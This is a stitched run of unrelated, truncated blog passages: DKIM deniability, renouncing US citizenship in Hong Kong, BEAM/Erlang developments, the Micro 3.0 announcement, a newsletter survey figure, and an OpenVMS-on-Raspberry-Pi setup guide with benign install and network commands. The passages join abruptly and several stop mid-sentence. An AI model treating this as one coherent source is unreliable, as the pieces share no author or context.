<p>Conversely, if you had used an email provider that practiced what Ryan proposed (rotating/publishing the private key at a regular interval), they couldn’t cryptographically prove anything. If the past private keys are public, anyone could have come along and forged the DKIM signature.</p>



<h2>On Post-Compromise Security</h2>



<p>The concept of <strong>Post-Compromise Security</strong> is somewhat related to deniability (but affects confidentiality rather than integrity or authenticity):</p>



<p>If someone successfully compromises one participant in a private discussion group, and their access is discovered, can the rest of the participants recover from this breach and continue to have privacy for future conversations?</p>



<p>It’s easy to see how the concepts are related.</p>



<ul><li>Deniability offers short-term authenticity followed by a long-term break in authenticity.</li><li>Post-Compromise Security offers long-term confidentiality even if there’s a short-term break in confidentiality.</li></ul>



<p>Robust private messaging protocols–such as what the IETF is trying to provide with <a href="https://datatracker.ietf.org/doc/draft-ietf-mls-protocol/">Message Layer Security</a>–would ideally offer both properties to their users.</p>



<p>Past attempts to build non-repudiation (through “message franking”) on top of cipher constructions like <a href="https://soatok.blog/2020/05/13/why-aes-gcm-sucks/">AES-GCM</a> led to a class of attacks known affectionately as Invisible Salamanders, based on the title of the <a href="https://eprint.iacr.org/2019/016">relevant research paper</a>.</p>



<h2>In Conclusion</h2>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Apropos of nothing, I really wish Gmail would start publishing its expired DKIM secret keys.</p>— Matthew Green (@matthew_d_green) <a href="https://twitter.com/matthew_d_green/status/1323011619069321216?ref_src=twsrc%5Etfw">November 1, 2020</a></blockquote></div>
</div></figure>



<p>It might seem really weird for cryptographers to want large-scale email providers to publish their expired DKIM secret keys, but when you understand the importance of deniability in past private communications, it’s a straightforward thing to want.</p>



<p>It’s worth noting: Some security experts will push back on this, because they work in computer forensics, and making DKIM deniable would theoretically make their job slightly more difficult. </p>



<p>Keep their self-interest in mind when they’re complaining about this notion, since the proposal is <strong>not</strong> to publish non-expired DKIM secret keys, and therefore it would not make spam more challenging to combat.</p>

<p>A few weeks ago, when I was trying to open an account at a financial institution here in Hong Kong, someone noticed I was born in the USA and my account was denied.</p><p>They wrote “I regret to inform you at this time we are unable to accept bank wire deposits/withdrawals from US citizens. For more information, please refer to our article: Restricted nationalities and countries.” While this is a common experience for Americans living abroad, one I’ve experienced many times before, it was a mistake, a mistake that reminded me to write this blog post.</p><p>A few days ago, I received a rather passive-aggressive email from one of my banks asking me to “let us know about your tax connection to the United States” with the threat of closing my account if I don’t. Another common experience for Americans living abroad, another mistake and another reminder to write this post.</p><figure><img src="https://larrysalibra.com/content/images/2020/11/Screen-Shot-2020-10-22-at-5.52.02-PM.png" alt=""></figure><p>Tomorrow, Americans will vote to choose one of two candidates no one really likes. I’m not allowed to vote this time around because two years ago, I finally rid myself of the burden that is American citizenship.</p><h2 id="a-hard-story-to-tell">A hard story to tell</h2><p>I’ve tried to write this blog post a number of times over the past two years. I’ve written entire drafts of this post from scratch more than once and never published them, unhappy with the tone or the content or the narrative or worried about the reaction of people I’ve never met on the internet. Perhaps it was the years of brainwashing…I mean, “<a href="https://en.wikipedia.org/wiki/Civic_education_in_the_United_States">civic education</a>”…in US public schools that has scared my psyche and made me afraid of what the tribe will do when it finds out I’ve deserted them. Having to say the "Pledge of Allegiance" every day during one's childhood before he knows what the words "pledge" or "allegiance" even mean really does a job on one's mind.</p><p>I want to tell my story because I hope that it will benefit others on their journey towards personal freedom just the stories of others benefited me.</p><p>Our story starts about a year ago, in October 2019.</p><p>It's 2am on a Saturday morning in Hong Kong and I can't sleep. My body thinks it's still in Paris after two weeks in Europe. One year ago today, I also couldn't sleep but for a different reason. I was tossing and turning from stress the night before what I thought was going to be the biggest decision of my life: to give up US citizenship.</p><p>After over 11 years living outside of the USA, I had made an appointment on October 12, 2018, at the US Consulate in Hong Kong to go through the process known as "expatriation" or "renouncing US citizenship."</p><p>This was the second appointment in the process. The first had been a few weeks prior, on August 31, 2018. You see, the United States wants you to believe that giving up US citizenship is a Big Deal, and in many ways it is! You lose a whole bunch of rights granted by citizenship such as no longer being able live or work in the country unless you get a visa. In this day and age of passports, visas and borders, (<a href="https://www.nationalgeographic.com/travel/features/a-history-of-the-passport/">it didn't used to be like this</a>! travel used to be free as in freedom!) if you didn't have another citizenship, you could become "stateless" with nowhere to go and no way to get past borders to get there. To someone like me who was born and raised in suburban Ohio, this felt like a Big Deal.</p><p>What they don’t tell you, is that you’re also freed from a number of coercive obligations you never agreed to that other countries don’t impose on their citizens by opting-out of US citizenship. They tell you it's all pain with no gain.</p><p>To drive home the Big Dealness of the decision, the State Department made me make two appointments at the consulate to make sure I got their point. And I had to make the appointments well in advance as they were fully booked for months. I wasn’t the only American in Hong Kong trying to exit.</p><p>At the first appointment, a nice vice consul named Rachel took me in to a tiny interview room complete with an American flag in the nondescript Garden Road compound. Our interview began with Rachel hitting her head on the phone on the wall quite hard as she was sitting down and me asking her with a bit of a shock, “OMG, are you okay?!?!" After a minute or so of rubbing her head and grimacing, she was fine and we started with our interview.</p><p>She roughly followed a script that is specified in the <a href="https://fam.state.gov/fam/07fam/07fam1260.html">US State Department's Foreign Affairs Manual</a>. She asked me questions about myself and my decision. Where was I from? (Ohio) How long have I lived abroad? (Since May, 2007) Where does my family live? (My parents live in the US and my brother lives in Bulgaria). Did I have another citizenship and passport? (Yes, Italian) Why did I want to give up US citizenship? (It's complicated, but I didn't feel American anymore and when visiting the US anymore I felt like a tourist).</p><p>After the questions she started reading me a list of what came off as warnings and disclaimers to make sure I knew what I was getting myself into:</p><ul><li>Any children I had wouldn't become US citizens</li><li>Might not be able to travel to the US again</li><li>Wouldn't be able to live or work in the US an appropriate visa</li><li>I would still have to file for and pay taxes that I owe</li><li>If I didn't have another citizenship I could be come stateless</li></ul><p>She then instructed me to take a couple of weeks for a "period of reflection" (this is required according to State Department regulations) and handed me a packet of papers to review listing the consequences giving up my blue passport and outlining the tax implications.</p><p>Where better to go to reflect and get some clarity on my decision to exit the US than to visit a country struggling with its own exit decision, the United Kingdom? So I headed off to the UK for a short vacation followed by a work trip in London.</p><p>By the time I made my first August appointment, I'd already made the decision - I'd been thinking about it for years and had done a ton of research and due diligence. I'd read a lot about other people's experiences and thinking. I was particularly inspired by bitcoin investor Roger Ver's story and Balajis Srinivasan's talk on <a href="https://www.youtube.com/watch?v=cOubCHLXT6A">Voice vs Exit</a>.</p><p>I was most concerned about losing the right to live and work in the US - it seems so many people want this right and that they're willing to go through great pain and inconvenience to get it. However, I hadn't ever used this right in the almost 20 years of my adult life. I’d always competed on the global market without the benefit of “work authorization” protecting me from competition of “aliens.” As life long entrepreneur and a strong advocate of remote work, I didn't ever see myself wanting to sign up for some office job in the States. But would I want to live there?</p><h2 id="a-tourist-in-my-own-country">A tourist in my own country</h2><p>In 2016, I flew to California and rented a car to do some due diligence on the country I was thinking of leaving. I spent a month driving across the US and back, taking in the sites and visiting places I thought I might like to live. The natural beauty of America and her parks is breathtaking. While it is amazing to visit and even vacation for a few weeks, it wasn’t someplace I'd want to live. New York and Chicago were my favorite cities, but cold climate and snow is a turn off as is the crumbling infrastructure and confiscatory tax rates.</p><p>A number of tech friends moved to Austin for the low tax and warm weather, so I stopped there for a few days. After over a decade in Asia, Austin hardly seems big enough to even be called a city. My impression was that it is a bunch of suburban sprawl with some bigger buildings in the middle. And I much prefer being on islands surrounded by water instead of landlocked.</p><figure><img src="https://larrysalibra.com/content/images/2020/11/IMG_5406.jpeg" alt=""></figure><p>In June of 2018, I took a vacation to America’s only state that is “a bunch of islands surrounded by water,” Hawaii. I had found memories of visiting the Aloha state as a child and wanted to make sure that I wasn't missing out on some future destiny where Larry becomes a Hawaiian like George Clooney in <em>The Descendants</em>. The nature was nice, but the poverty, crime and remoteness from everywhere made it not very attractive as a future home.</p><p>I'd discussed the decision with family and friends. Friends ranged from very unhappy to mildly supportive to downright enthusiastic. My brother, also an entrepreneur who has lived outside of the States for more than a decade, was understanding of the challenges the USA imposes on its entrepreneurs abroad and very supportive. My parents were skeptical that it was the right decision. They'd lived their whole lives in the USA and grown up on stories of World War II valor and of their grandparents who had struggled to immigrate to the United States for a better life. They shared their views with me but never gave me any pressure and let me make my own decision.</p><h2 id="the-oath">The oath</h2><p>October 12, 2018, my second appointment in the renunciation process, quickly arrived. I couldn’t really sleep the night before. I was nervous about both the appointment and a <a href="https://blog.blockstack.org/a-path-to-decentralization/">big work announcement</a>. Lots of things were changing.</p><p>In the morning, I woke up and took a taxi to the US consulate for my appointment. Here’s a picture of me before the appointment. You can see the stress in my face.</p><figure><img src="https://larrysalibra.com/content/images/2020/11/IMG_8562.jpeg" alt=""></figure><p>After entering the consulate and going through security, the first step of the appointment was paying the fee: US$2,350. You can’t free yourself from the Land of the Free without having the cash money to buy your freedom. Think of the renunciation fee as an emancipation fee, a lot of money, but a small price to pay for freedom.</p><figure><img src="https://larrysalibra.com/content/images/2020/11/https---blogs-images.forbes.com-robertwood.jpg" alt=""></figure><p>The actual renunciation ceremony was sort of an out-of-body blur. I felt like I was watching myself in the little room with the American flag renouncing my allegiance (which of course the US education system forces children who don’t know what the word “allegiance” means to “pledge”) to the USA.</p><p>The consular official told me that they would take my US passport and hold on to it until the State Department approved my renunciation and return it to me canceled along with my Certificate of Loss of Nationality (CLN) at some later date. He advised that if I needed to travel to the US I might be able to borrow the passport for a trip if the …</p></div></section></article></div></div></div>

        <p>The BEAM is the virtual machine that Erlang and Elixir runs on. It is widely cited as a battle-tested piece of software though I don’t know in which wars it has seen action. It has definitely paid its dues in the telecom space as well as globally scaled projects such as Whatsapp and Discord. It is well suited to tackle soft-realtime distributed systems with heavy concurrency. It has been a good platform chugging along. And with a small team at Ericsson responsible for much of its continuing development it has been managed in a deeply pragmatic way. Erlang has always been a bit of a secret and silent success. Almost no-one uses it if you look at market shares. But among the ones that use it there seems to be a very positive consensus. And then Elixir came and caused a bit of a boom. I think the BEAM has benefited from Elixir and Elixir wouldn’t exist without the BEAM. With that bit of background I’d like to shine a light on some cool developments that I think makes the BEAM more interesting or even uniquely interesting in the future.</p>
<h2 id="the-jit-is-here-soon-otp-24">The JIT is here (soon, OTP 24)</h2>
<p>With OTP 24 landing sometime next year we are going to get the a JIT for the BEAM. Based on the project <a href="https://github.com/asmjit/asmjit">AsmJit</a> this will mean that some BEAM code will be translated to native instructions. It will not be the kind of warm-up-for-performance-gains JIT that I’ve heard of in PyPy but rather significantly simpler. The goal of the project was to introduce a JIT that could give performance gains for some cases but would not cause any performance regressions. A pragmatic and laudable approach. Considering this made the Jason JSON-library (written in Elixir) beat the Jiffy JSON-library (written as a C NIF) in <strong>some</strong> tests I think this has the potential to obviate the need for some NIF implementations. Avoiding reaching out to the lower level code that is more capable but more dangerous is a good win.</p>
<p>Anyone running RabbitMQ should look forward to the update as measurements indicate 30-50% increased message throughput. Which is a nice thing to get for no code changes at all.</p>
<p>Pushing the performance of the BEAM closer to native is magnificent. To be clear the BEAM is already quite a good performer. I would put Erlang and Elixir at the abstraction level of languages like Python/Ruby/Node.js. Python and Ruby are poor performers. The Python ML stuff all goes into C++ or similar for performance. I’ve worked a bunch with Python and the things I hear from the Ruby world makes them sound quite equivalent in performance. They are a bit slow and can only <a href="https://underjord.io/more-than-one-thing-at-a-time.html">do one thing at a time</a>. Node.js is a bit different. It can do multiple things at a time, if you append asterisks and squint. It does it largely the same way Python + Gevent does it. This approach is incredibly susceptible to CPU-bound work causing head-of-line blocking. It becomes the single most important consideration for building a performant application “get to IO, don’t compute”. V8 that Node.js runs on is heavily optimized and fast for such a dynamic language. I think the BEAM provides a better approach that can deliver comparable results without as many footguns (opportunities for shooting yourself in the foot). But getting better at the raw crunching is a big gain with this JIT implementation and I look forward to the release.</p>
<h2 id="lumen---static-compilation--wasm">Lumen - Static compilation &amp; WASM</h2>
<p>The <a href="https://getlumen.org/">Lumen project</a> is a huge effort by a gang of open source developers and DockYard to implement a compiler (and more) that can take Elixir and Erlang into the browser. By solving that they end up solving static compilation for Erlang and Elixir as well. So this isn’t compiling and shipping the BEAM to the browser. This is a faithful reimplementation of the BEAM functionality in a way that allows it to be compiled statically. It uses LLVM and requires quite a bit of effort both in development and in wrangling the Web Assembly work group process stuff to make sure that the standard is not entirely run by Object-Oriented Programming needs.</p>
<p>I don’t think Lumen will replace the BEAM. The BEAM has a brilliant track record for long-running services and distributed computing that the Lumen project do not even attempt to achieve right now. Instead the Lumen project will allow Elixir and Erlang to move into spaces where the BEAM might be a bit too heavy and still provide the same guarantees. Typically I see it being good for command line tools, web frontends (super interesting to consider the Actor model going there), serverless/edge computing and potentially with WASM competing with Docker as a delivery mechanism for code in Kubernetes, using something like <a href="https://github.com/deislabs/krustlet">Krustlet</a> (<a href="https://player.fm/series/software-sessions/webassembly-on-the-server-with-krustlet">good podcast episode on WASM/Krustlet</a>). It’s probably Cloud Native or something. Who knows.</p>
<p>What gives Lumen the potential to be a better fit in these circumstances is that it can optimize for filesize (by cutting out hot code updates) and it is likely able to start much faster. Lumen is written in Rust. Which seems to be the popular choice around Web Assembly from what I’ve seen. Lumen is still an early release project and not fit for production. But it is beeing actively pushed forward.</p>
<h2 id="nerves---an-iot-platform-with-minimal-suck">Nerves - An IoT platform with minimal suck</h2>
<p>The <a href="https://www.nerves-project.org/">Nerves project</a> is fantastic. I’m a hardware hobbyist, not an IoT dev but I’ve worked a fair bit with Nerves and it is so, so good. What Nerves gives you when working with a Raspberry Pi for example is a way to let your code run all of the device. The BEAM is basically your operating system on top of a minimal Linux installation. The Linux you have is based on the solid foundation of Buildroot so it is quite feasible to modify it as you see fit. The big idea is that if you are running a Linux-level SBC already you might as well build on something that gives you the guarantees of the BEAM.</p>
<p>Beyond that the default setup encodes a lot of good embedded practices by default so that you avoid bricking devices with firmware updates, you get easy support for pushing firmware over the network or USB and much, much more.</p>
<p>There are a ton of good libraries for sensors and assorted hardware, as well as the common protocols like GPIO/SPI/I2C/UART. Networking support is well considered and has been reworked since I first started using Nerves a few years back (and it worked well then too). BLE is getting more and more good support recently.</p>
<p>The project also created <a href="https://www.nerves-project.org/nerveshub">NervesHub</a> which is a solution for managing a fleet of devices by securely providing firmware updates, allowing the switching on of a remote console on devices if that’s a need on your product. I think the most recent stuff is a UI revamp and some serious work on binary diffed patches to minimize firmware update sizes for data-constrained deployments.</p>
<p>This is very much a production project and people are shipping hardware with Nerves. It keeps marching forward.</p>
<h2 id="the-beam-can-be-your-entire-application">The BEAM can be your entire application</h2>
<p>Saša Jurić, author of the much-acclaimed Elixir in Action book has produced a library called <a href="https://github.com/sasa1977/site_encrypt">site_encrypt</a>. It allows you to handle LetsEncrypt configuration without a separate webserver or actually using certbot.</p>
<p>Now this library is good and meaningful in its own right but the underlying idea is why I bring it up. The BEAM can be your entire application. This is something I’ve realized over time. Where in Python you would reach for Gunicorn to run you Django app and Nginx to protect Gunicorn from the big bad world.. The BEAM is made for this. Introducing an intermediate layer of Nginx (or another HTTP server) might actually be detrimental in that you now have two things you need to configure correctly and two pools of multi-core processing workers that care about this request/response cycle and can independently screw it up.</p>
<p>The BEAM was always built for this. OTP has a lot weird corners where you find interesting libraries such as <code>wx</code> for WxWidgets (window management) and <code>ssh</code> for both SSH client and server work I believe. Because it is meant to be delivered as a full solution. It can run and manage multiple different types of work inside of it. Gracefully. It doesn’t replace Kubernetes for the large deployment or polyglot environments. But it might very well mean you don’t actually need to go there early. Or you can reduce how much Ops you need in your Dev. If your entire stack is Elixir or Erlang front to back I think you have empowered your developers significantly.</p>
<p>There is already a move towards this where tools are converging that give us a lot of things out of the box that we’d otherwise need to move outside our application for. These are pragmatic 80-90% solutions. The normal solutions are still all there if you need to reach for them. But maybe you don’t. I see these as moves in the same vein:</p>
<ul>
<li>LiveView - We can reduce the amount of frontend we need to build that isn’t BEAM code (Elixir or Erlang), in some cases get rid of it entirely.</li>
<li>Live Dashboard - Application insights right in your application stack instead of pushing them out to another solution.</li>
<li>Phoenix PubSub - Distributed PubSub without requiring coordination via something like Redis.</li>
<li>Phoenix Channels - Distributed PubSub over WebSockets using the above PubSub to coordinate delivery.</li>
<li>Phoenix Presence - Distribute Presence. A CRDT-powered thing for maintaining information about if someone is connected to a channel or not, like chatrooms and online/offline. Using Channels.</li>
</ul>
<p>Lowering complexity by keeping the solutions in a system you understand well is potentially very powerful. At some point many projects will need to pick up external dependencies such as Nginx, Redis or whatever. But I think there is something compelling about building your application inside a system that can do all of it quite well. Elixir and Phoenix already have significant mind-share in the startup world. I wouldn’t be surprised if this ends up being a very popular solution for startups. No frontend-specific code for the MVP, no New Relic or Mixpanel bill we make do with the Live Dashboard. Distribution is Erlang distribution + Swarm/Horde/Libcluster or something …</p></article></div>

      <p>This is the official announcement for the release of Micro 3.0 better known as M3O - a platform for cloud native development. 
Our 3.0 release is a major refactor and consolidation of the existing tooling into something that addresses the entire workflow 
of build, run, manage and consume all from the developers perspective.</p>

<p>Read on to learn more or go straight to the <a href="https://github.com/micro/micro/releases/latest">latest release</a>. 
Head to <a href="https://m3o.com/">m3o.com</a> for the hosted offering.</p>

<h2 id="overview">Overview</h2>

<p>Micro focuses on developer productivity for the backend. It’s clear that the Cloud has become infinitely more complex 
over the past few years. Micro attempts to create order out of that chaos by distilling it all down to a handful of 
primitives for distributed systems development.</p>

<p>Why should you care? If you’re reading this you’ve no doubt encountered the tedious nature of infrastructure management, 
wrangling a kubernetes cluster on AWS or the thousands of things you need to do to cobble together a platform before 
starting to build a product. We think we’ve nailed the solution for that just as Android did for Mobile. Keep reading 
if you want to find out more.</p>

<h2 id="quick-flashback">Quick Flashback</h2>

<p>Micro started out as a <a href="https://micro.mu/blog/2016/03/20/micro.html">toolkit for microservices</a> development, 
incorporating an api gateway, web dashboard and cli to interact with services built using a Go RPC framework. 
Back then it felt like getting anyone to buy into PaaS again was going to be a losing battle. So we chose 
to write single purpose tools around an RPC framework thinking it might allow people to adopt it piece by piece 
until they saw the need for a platform. It was really straight forward right until it wasn’t.</p>

<p>There was a simple Go framework plus some surrounding 
components to query and interact with them, but like any long lived project, the complexity grew as we 
tried to solve for that platform experience that just couldn’t be done with a swiss army knife. The repo 
exploded with a number of independent libraries. To the creator its obvious what these are all for but to 
the user there is nothing but cognitive overload.</p>

<p>In 2019 we went through a <a href="https://micro.mu/blog/2019/06/10/the-great-consolidation.html">consolidation</a> of all those libraries 
which helped tremendously but there was still always one outstanding question. What’s the difference between 
<a href="https://github.com/micro/micro">micro</a> and <a href="https://github.com/micro/go-micro">go-micro</a>? It’s a good 
question and one we’ve covered before. We saw go-micro as a framework and micro as a toolkit but these 
words were basically empty and meaningless because multiple projects working in coordination really need a 
crisp story that makes sense and we didn’t have one.</p>

<p>In 2020 we’re looking to rectify that but let’s first let’s talk about platforms.</p>

<h2 id="paas-in-2020">PaaS in 2020</h2>

<p>5 years ago the world exploded with a proliferation of “cloud native” tooling as containers and 
container orchestration took centre stage. More specifically, Docker and Kubernetes redefined the 
technology landscape along with a more conscious move towards building software in the cloud.</p>

<p>Micro took a forward looking view even as far back as 2015. It was clear distributed systems and cloud native 
was going to become the dominant model for backend services development over the coming years but, what wasn’t clear 
is just how long we’d spend wrangling all sorts tools like docker, kubernetes, grpc, istio and everything else. 
It felt like we were rebuilding the stack and weren’t really ready to talk about development aspects of it all.</p>

<p>In fact at that time, people mostly wanted to kick the tyres on all these tools and piece something together. 
Running kubernetes yourself became all the rage and even using service mesh as the holy grail for solving 
all your distributed systems problems. Many of us have come to realise while all of this tech is fun 
it’s not actually solving development problems.</p>

<p>We’ve gotten to the point of managed kubernetes and even things like Google Cloud Run or DigitalOcean App 
Platform, but none of these things are helping with a development model for a cloud native era. Our 
frustrations with the existing developer experience have grown and Micro felt like something that 
could solve for all that, but only if we took a drastic step to overhaul it.</p>

<p>We think PaaS 3.0 is not just about running your container or even your source code but something that 
encapsulates the entire developer experience including a model for writing code for the cloud. Based on that 
Micro 3.0 aka M3O is a platform for cloud native development.</p>

<h2 id="what-even-is-cloud-native">What even is Cloud Native?</h2>

<p>What is cloud native? What does it mean to build for the cloud? What is a cloud service?</p>

<p>Cloud native is basically a descriptive term for something that was built to run in the cloud. That’s it. It’s not 
magic, it might sound like a buzzword, but the reality is it simply means, that piece of software was built 
to run in the cloud. How does that differ from the way we used to build before? Well the idea behind the cloud 
is that its ephemeral, scalable and everything can be accessed via an API.</p>

<p>Our expectation for services running in the cloud is that they’re mostly stateless, leveraging external services 
for the persistence, that they are identified by name rather than IP address and they themselves provide an 
API that can be consumed by multiple clients such as web, mobile and cli or other services.</p>

<p>Cloud native applications are horizontally scalable and operate within domain boundaries that divide them as 
separate apps which communicate over the network via their APIs rather than as one monolithic entity. 
We think cloud services require a fundamentally different approach to software creation and why Micro 3.0 
was designed with this in mind.</p>

<h2 id="micro-30-aka-m3o">Micro 3.0 aka M3O</h2>

<p>Micro 3.0 (M3O) reimagines Micro as a platform for cloud native development. What does that mean? Well we think of 
it as PaaS 3.0, a complete solution for source to running and beyond. Micro has moved from just being a Go 
framework to incorporating a standalone server and hosted platform. Our hosted offering is called 
<a href="https://m3o.com/">M3O</a>, a hat tip to Micro 3.0 or M[icr]o, whichever way you want to see it.</p>

<p>Another way to think about it. What Git is to GitHub, Micro is to the M3O platform. Let’s dig into it.</p>

<p>Micro 3.0 includes the following.</p>

<h3 id="server">Server</h3>

<p>The server is our abstraction for cloud infrastructure and underlying systems you might need for writing 
distributed systems. The server encapsulates all of these concerns as gRPC services which you can 
query via any language. The goal here is to say developers don’t really need to be thinking about infrastructure 
but what they do need is design patterns and primitives for building distributed systems.</p>

<p>The server includes the following:</p>

<ul>
  <li>
    <p><strong>Authentication</strong>: Auth whether its authentication or authorization is part of the system. Create JWT tokens, define access rules, use one system to govern everything in a simple and straight forward manner. Whether it’s for a user or a service.</p>
  </li>
  <li>
    <p><strong>Configuration</strong>: Dynamic config management allows you to store relevant config that needs to be updated without having to restart services. Throw API keys and business logic related configuration into the secure config service and let your services pick up the changes.</p>
  </li>
  <li>
    <p><strong>Key-Value Storage</strong>: We’re focused on best practices for microservices development which means keeping services mostly stateless. To do this we’re providing persistent storage on the platform. Key-Value allows you to rapidly write code and store data in the format you care about.</p>
  </li>
  <li>
    <p><strong>Event Streaming</strong>: Distributed systems are fundamentally in need of an event driven architecture to breakdown the tight dependencies between them. Using event streaming and pubsub allows you to publish and subscribe to relevant events async.</p>
  </li>
  <li>
    <p><strong>Service Registry</strong>: Micro and M3O bake in service discovery so you can browse a directory of services to explore your service APIs and enable you to query services by name. Micro is all about microservices and multi-service development.</p>
  </li>
  <li>
    <p><strong>Service Network</strong>: Because you don’t want to have to resolve those service names to addresses and deal with the load balancing aspect, the server bakes in a “service mesh” which will handle your inter-service requests (as gRPC) and route to the 
appropriate instance.</p>
  </li>
  <li>
    <p><strong>Identity Proxy</strong>: We include a separate identity proxy for external requests using gRPC via the CLI and other means. This enables you to query from your local machine or anywhere else using valid auth credentials and have it seamlessly work as if 
you were in the platform itself.</p>
  </li>
  <li>
    <p><strong>API Gateway</strong>: Finally there’s an API gateway that automatically exposes your services to the outside world over HTTP. Internally writing service to service using gRPC makes sense, but at the end of the day we want to build APIs consumed from clients via HTTP.</p>
  </li>
</ul>

<h3 id="clients">Clients</h3>

<p>The server provides inter-service communication and two means of external communication with a HTTP API and gRPC proxy but that 
experience is made much better when there’s user experience on the client side that works. Right now we’ve got two ways of doing this.</p>

<ul>
  <li>
    <p><strong>Command Line</strong>: The CLI provides a convenient and simple way to talk to the server via gRPC requests through the proxy. 
The most convenient commands are builtin but every service you write also gets beautiful dynamic generated commands 
for each endpoint.</p>
  </li>
  <li>
    <p><strong>gRPC SDKs</strong>: Every service in the server is accessible via gRPC. We’re code generating clients for the server itself 
so you can access them from any language. What this enables is a wide array of experiences on the client side without 
having to handcraft libraries for each language.</p>
  </li>
  <li>
    <p><strong>Web Interface</strong>: Coming soon is a dynamically generated web interface that creates a simple query mechanism through a 
browser for any of your services. We’ve got a http api, gRPC proxy and command line interface but feel like the browser 
could use some love too.</p>
  </li>
</ul>

<h3 id="framework">Framework</h3>

<p>One thing we really understood from our time working on go-micro was that the developer experience really …</p></div></div>

I thought it would be interesting to know how many newsletters people read on the daily/ weekly basis. It turns out not that many. <strong>113 people out of 191 people</strong> read only one newsletter. I must say it's very hard to get loyal and engaged subscribers. However, there is still some hope because quite a few people read 2-6 newsletters.

<p>Having recently changed jobs and become self-employed, I have a lot more spare time.  What better way to spend it than getting an OpenVMS machines running on a Raspberry Pi.</p>



<figure><img loading="lazy" width="1024" height="768" src="https://blog.poggs.com/wp-content/uploads/2020/04/vax8550-1024x768.jpg" alt="" srcset="https://blog.poggs.com/wp-content/uploads/2020/04/vax8550-1024x768.jpg 1024w, https://blog.poggs.com/wp-content/uploads/2020/04/vax8550-300x225.jpg 300w, https://blog.poggs.com/wp-content/uploads/2020/04/vax8550-768x576.jpg 768w, https://blog.poggs.com/wp-content/uploads/2020/04/vax8550-1536x1152.jpg 1536w, https://blog.poggs.com/wp-content/uploads/2020/04/vax8550-2048x1536.jpg 2048w, https://blog.poggs.com/wp-content/uploads/2020/04/vax8550-400x300.jpg 400w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px"><figcaption>VAX 8550 and console, courtesy of <a href="https://commons.wikimedia.org/wiki/User:Mu301">Michael L.

<p>These instructions are necessarily quick and make assumptions that you know what you’re doing.  They’re also heavily influenced by <a rel="noreferrer noopener" href="http://this YouTube video" target="_blank">this YouTube video</a>, and I’m very grateful for the simple explanation of Linux bridge and tap interfaces.</p>



<h2>The basics</h2>



<p>I started by copying the <a href="https://ubuntu.com/download/raspberry-pi">32-bit version of Ubuntu 18.04LTS for the Raspberry Pi 3</a> on to an SD card.  Pop that in your Pi and boot up with an Ethernet cable connected and a DHCP server available.  There’s no need to attach a keyboard or monitor – just ssh in to the server with username and password, and it’ll prompt you to change your password on first login.</p>



<p>Cloning the simh repository and installing dependencies is straightforward, and takes about four minutes in my Pi 3B+:</p>



<pre>apt install make libsdl2-dev libpng-dev libpcap-dev libvdeplug-dev bridge-utils
git clone https://github.com/simh/simh.git
cd simh
make -j4 vax8600</pre>



<p>There are other targets you can build for, but we’re going to use the VAX 8600.</p>



<figure><table><tbody><tr><td><strong>Target</strong></td><td><strong>Simulator</strong></td></tr><tr><td>microvax1</td><td>MicroVAX I (KA610)</td></tr><tr><td>microvax2</td><td>MicroVAX II (KA630)</td></tr><tr><td>microvax3900</td><td>MicroVAX 3900</td></tr><tr><td>rtvax1000</td><td>rtVAX100 (KA620)</td></tr><tr><td>vax</td><td>MicroVAX 3900</td></tr><tr><td>vax730</td><td>VAX 11/730</td></tr><tr><td>vax750</td><td>VAX 11/750</td></tr><tr><td>vax780</td><td>VAX 11/780</td></tr><tr><td>vax8200</td><td>VAX 8200 (KA820)</td></tr></tbody></table><figcaption>VAX architecture build targets for SimH</figcaption></figure>



<p>Whilst it’s compiling, create a directory to hold your SimH installation, and copy your OpenVMS 7.3 (VAX) ISO image over to it.  I’ve used ~/simh, but you can use whatever you like as long as you’re consistent.</p>



<p>Create the file vax8600.ini with the following content.  I’ve annotated each line so you can see what it does:</p>



<pre>; Set the memory size to 512 megabytes
set cpu 512M

; Use a TCP socket for the console
set console telnet=12344

; Set the CPU idle detection method to VMS to improve performance when OpenVMS isn't doing anything
set cpu idle=vms

; Set the CPU to a model 8650 (<a href="https://en.wikipedia.org/wiki/VAX_8000">https://en.wikipedia.org/wiki/VAX_8000</a>)
set cpu model=8650

; Configure an 1.5 gigabyte RA92 disk (<a href="http://bitsavers.informatik.uni-stuttgart.de/pdf/dec/disc/ra90/EK-ORA90-SV-003_RA90_RA92_Service_Jun90.pdf">http://bitsavers.informatik.uni-stuttgart.de/pdf/dec/disc/ra90/EK-ORA90-SV-003_RA90_RA92_Service_Jun90.pdf</a>) on disk interface RQ0
set rq0 ra92

; Attach a disk image to interface RQ0 - SimH will create this on boot
attach RQ0 rq0-ra92.dsk

; Configure a CD-ROM drive (RRD40) on disk interface RQ3
set rq3 cdrom

; Attach the installation disk ISO image to interface RQ3
attach RQ3 -r openvms73.iso

; Disable  the RP Massbus controller
set rp disable

; Disable the RL11 cartridge disk controller
set rl disable

; Disable the RK611 cartridge disk controller
set hk disable

; Disable the RX211 floppy disk controller
set ry disable

; Disable the ??
set ru disable

; Disable the TS11 magnetic tape controller
set ts disable

; Disable the TUK50 magnetic tape controller
set tq disable

; Disable the DZ11 8-line terminal multiplexer
set dz disable

; Disable the LP11 line printer
set lpt disable

; Enable the Ethernet controller
set xu enable

; Set the MAC address to use for the Ethernet controller
set xu mac=08-00-2b-00-00-0a

; Attach the Ethernet controller to a TAP interface 'vaxa'
attach xu tap:tapvax</pre>



<p>When your VAX binary has compiled, copy it from simh/BIN/vax in to your VAX directory.  </p>



<h2>Setting up networking</h2>



<p>We’re ready to boot our emulator, but we need to set up networking first.  It’s not much fun to have a standalone VAX, so we’re going to create a <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/TUN/TAP" target="_blank">TAP interface</a> and a bridge to allow our VAX to access our network.</p>



<p>A TAP interface virtual interface which runs at the Data Link layer (MAC) and allows us to connect the VAX’s Ethernet interface to an interface on our host operating system.</p>



<p>Setting the TAP interface is as easy as running this command:</p>



<pre>ip tuntap add mode tap user ubuntu tapvax
ip link set dev tapvax up</pre>



<p>If you’re not running under user ‘ubuntu’, change it to your user name.</p>



<p>To access the network, we need to set up a bridge – which is like a switch (or hub, if you’ve been working with Ethernet for as long as I have) and connects many interfaces together.  We’re going to create a bridge called ‘br0’, and add the ‘tapvax’ interface to it, and add the Pi’s ‘eth0’ interface.</p>



<p>My preferred way of doing this is to configure <a href="https://netplan.io/">Netplan</a> to do it for us.  It’s quite straightforward – create /etc/netplan/01-network.yaml with the following:</p>



<pre>network:
